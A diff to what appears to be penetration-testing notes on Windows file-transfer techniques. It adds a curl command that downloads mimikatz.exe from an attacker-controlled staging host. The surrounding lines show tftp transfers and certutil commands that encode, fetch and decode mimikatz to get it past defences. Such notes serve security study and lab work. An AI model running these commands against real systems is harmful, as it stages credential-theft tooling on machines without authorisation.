@@ -32,6 +32,11 @@ tftp -i http://192.168.119.194:8000/ put filename
 tftp -i http://192.168.119.194:8000/ get filename
 ```
 
+#### Curl
+```
+curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
+```
+
 #### Certutil
 
 Basic transfert
@@ -44,6 +49,7 @@ certutil.exe -encode mimikatz.exe mimikatz.txt
 certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimikatz.txt
 certutil.exe -decode mimikatz.txt mimikatz.exe
 ```
+
 
 # Linux Methods
 
